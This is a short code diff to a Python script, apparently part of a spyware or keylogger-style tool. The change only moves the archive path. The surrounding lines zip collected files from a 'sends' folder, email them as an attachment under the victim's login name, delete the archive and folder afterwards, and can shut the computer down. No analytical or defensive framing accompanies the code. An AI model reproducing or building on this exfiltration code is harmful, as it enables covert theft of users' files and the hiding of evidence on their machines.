@@ -121,7 +121,7 @@ while b:
     arsivlenecekDosyalar = []
     for belge in glob.iglob("sends/*", recursive=False):
         arsivlenecekDosyalar.append(belge)
-    with zipfile.ZipFile("bla/sends.zip", "w", compression=14) as arsiv:
+    with zipfile.ZipFile("sends.zip", "w", compression=14) as arsiv:
         for dosya in arsivlenecekDosyalar:
             arsiv.write(dosya)
     # login
@@ -138,10 +138,10 @@ while b:
     mesaj["Subject"] = os.getlogin() + " Logged In"
 
     # ----------------------------
-    if os.path.exists("bla/sends.zip"):
+    if os.path.exists("sends.zip"):
         # zip
         part = MIMEBase('application', "octet-stream")
-        part.set_payload(open("bla/sends.zip", "rb").read())
+        part.set_payload(open("sends.zip", "rb").read())
         encoders.encode_base64(part)
         part.add_header('Content-Disposition', 'attachment; filename=' + "sends.zip")
         mesaj.attach(part)
@@ -165,7 +165,7 @@ try:
     if t3.isAlive():
         t3.join()
     os.remove("sends")
-    os.remove("bla/sends.zip")
+    os.remove("sends.zip")
     if mshutdown == 1:
         os.system("shutdown /s /t 1")
     elif mshutdown == 2:
